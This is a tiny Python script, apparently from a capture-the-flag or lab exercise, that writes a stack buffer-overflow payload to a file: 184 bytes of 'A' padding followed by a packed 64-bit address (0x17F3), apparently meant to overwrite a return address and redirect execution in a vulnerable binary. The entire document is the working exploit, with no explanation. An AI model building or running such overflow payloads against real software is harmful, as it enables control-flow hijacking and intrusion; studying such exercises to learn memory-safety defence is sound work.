from struct import *

def run():
    f = open("inp" , "wb")

    f.write(b"A" * 184)
    f.write(pack("<Q", 0x17F3))
    f.write(b"\n")
    f.close()
        

if __name__ == '__main__':
    run()
